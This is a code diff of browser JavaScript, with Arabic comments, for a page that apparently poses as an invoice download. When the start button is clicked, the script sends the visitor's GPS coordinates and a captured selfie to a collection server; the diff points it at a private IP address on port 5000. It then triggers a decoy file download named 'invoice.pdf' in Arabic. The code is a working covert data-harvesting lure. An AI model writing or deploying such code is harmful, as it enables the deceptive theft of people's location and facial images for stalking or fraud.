@@ -41,14 +41,14 @@ document.getElementById('start').addEventListener('click', async () => {
     canvas.style.display = 'none';
 
     // إرسال البيانات للسيرفر
-    fetch('https://yourserver.com/upload', {  // ضع رابط سيرفرك هنا
+    fetch('http://192.168.43.212:5000', {  // ضع رابط سيرفرك هنا
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ lat: lat, lon: lon, selfie: selfieData })
     }).then(() => {
         // تنزيل الملف بعد إرسال البيانات
         const a = document.createElement('a');
-        a.href = 'https://yourserver.com/file.pdf'; // رابط الملف
+        a.href = 'temp.pdf'; // رابط الملف
         a.download = 'فاتورة.pdf';
         document.body.appendChild(a);
         a.click();
